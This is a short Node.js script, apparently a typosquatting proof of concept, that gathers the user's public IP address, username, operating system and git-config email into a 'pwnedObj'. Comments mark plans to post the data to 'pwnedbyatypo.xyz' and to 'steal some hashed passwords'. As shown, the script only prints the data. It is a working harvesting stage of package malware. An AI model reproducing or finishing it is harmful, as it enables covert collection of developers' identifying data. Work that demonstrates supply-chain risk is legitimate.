#! /usr/bin/env node
'use strict';

const async = require('async');
const chalk = require('chalk');
const isRoot = require('is-root');
const network = require('network');
const os = require('node.os');
const shell = require('shelljs');
const username = require('username');
const gitconfig = require('git-config');

let operations = [];
operations.push(getPublicIp);
operations.push(getUsername);
operations.push(getOs);
operations.push(getEmail);

async.series(operations, function(err, results) {
    if (err) {
        return err;
    } else {
        // TODO - post to pwnedbyatypo.xyz        
        let pwnedObj = {
            'ip': results[0],
            'username': results[1],
            'platform': results[2],
            'email': results[3]
        };
        console.log(pwnedObj);
    }
});


//get public IP
function getPublicIp(callback) {
    network.get_public_ip(function(err, ip) {
        if (err) {
            return callback(err);
        } else {
            callback(null, ip);
        }
    });
};

//get username
function getUsername(callback) {
    username().then(function(username) {
        callback(null, username);
    });
};

//get OS and TODO steal some hashed passwords
function getOs(callback) {
    let platform = os.os;
    callback(null, platform);
};

//get email from gitconfig
function getEmail(callback) {
    gitconfig(function (err, config) {
        if (err) {
            return callback(err);
        }
        callback(null, config.user.email);
    });
};
